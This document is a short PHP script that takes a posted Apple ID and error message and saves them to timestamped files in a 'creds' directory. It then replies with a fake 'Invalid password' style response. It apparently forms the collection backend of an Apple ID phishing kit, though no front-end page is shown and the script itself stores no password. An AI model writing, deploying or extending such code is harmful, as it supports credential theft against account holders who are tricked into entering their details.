<?php
header('Content-Type: application/json');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || empty($data['appleid'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error']);
    exit;
}

$appleid = $data['appleid'];
$error = $data['error'] ?? 'Invalid password';
$timestamp = date('Y-m-d_H-i-s');

$credsDir = dirname(__DIR__) . '/creds';
if (!file_exists($credsDir)) {
    mkdir($credsDir, 0755, true);
}

$filename = $credsDir . '/login_error_' . $timestamp . '.txt';

$logEntry = "[" . $timestamp . "] LOGIN FAILED - " . $appleid . " - " . $error . "\n";

file_put_contents($filename, "Apple ID: " . $appleid . "\nError: " . $error . "\nTimestamp: " . $timestamp . "\n");

echo json_encode(['status' => 'success', 'error' => $error]);